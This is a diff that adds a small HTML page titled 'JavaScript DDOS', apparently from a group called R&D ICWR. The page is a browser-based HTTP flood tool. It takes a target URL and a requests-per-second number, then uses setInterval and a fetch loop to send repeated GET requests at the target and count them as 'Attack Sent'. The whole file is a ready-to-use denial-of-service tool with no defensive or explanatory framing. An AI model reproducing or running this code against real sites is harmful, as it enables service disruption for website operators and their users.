@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>JavaScript DDOS | R&D ICWR</title>
+    <script>
+        var x=0;
+
+        function flood(xurl,total){
+
+	        for(i=0;i<total;i++){
+
+                fetch(xurl,{method:'get'});
+    	        document.getElementById("result").value=++x;
+
+	        }
+
+        }
+
+        function start_flood(){
+
+            var xurl=document.getElementById("url").value;
+	        var total=document.getElementById("total").value;
+            flood(xurl,total);
+
+        }
+    </script>
+</head>
+<body>
+    <span style="font-size: 30px;">JavaScript DDOS | R&D ICWR</span>
+    <br><br>
+    URL : <input type="text" id="url">
+    <br><br>
+    Thread / Sec : <input type="number" id="total">
+    <br><br>
+    Attack Sent -> <textarea cols="50" rows="1" id="result"></textarea>
+    <br><br>
+    <button onclick="xxx=setInterval(start_flood,1000)">Start!</button> <button onclick="clearInterval(xxx)">Stop</button>
+</body>
+</html>
